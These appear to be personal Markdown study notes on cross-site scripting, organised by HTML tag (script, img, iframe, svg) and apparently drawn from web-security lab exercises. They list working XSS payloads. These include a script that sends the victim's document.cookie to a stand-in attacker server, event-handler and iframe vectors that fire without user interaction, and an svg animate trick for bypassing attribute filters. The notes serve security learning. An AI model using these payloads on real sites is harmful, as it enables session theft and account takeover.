
## `script`

* inline script: embedded in the html
* loaded from separate files `<script src="URL_OF_EXTERNAL_SCRIPT"></script>`

EX:

* if the attacker injects this code in victim's browser, unpon visiting, victim
sends a GET request to the attacker's machine:

```js
<script>image = new Image();image.src='http://attacker_server_ip/?c='+document.cookie;</script>
```

* `<script>alert(document.domain)</script>`
* it could be inside an input tag `<input><script>alert(1);</script></input>`

## `<img>`

EX:

* `<img onload=alert('the image has been loaded!') src="example.png">`
* `<img src=1 onerror=alert(1)>`

## `iframe`

* without user interaction [`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E "onload=this.style.width='100px'>`](Reflected XSS into HTML context with most tags and attributes blocked.md)

## `<select>``</select>`

what to do with this? XSS between HTML tags

When the XSS context is text between HTML tags, you need to add new HTML tags to
trigger execution of JavaScript. e.g. `<img>`, `<script>`

## `svg`

a containter to create and display graphics.

* it's `<animate>` element could be used to set attributes:

[[XSS_examples#Reflected XSS event handlers and `href` attributes blocked| `<svg><a><animate attributeName="href" values="javascript:alert()"></animate><text x=20 y=20>Click me</text></a></svg>`]]

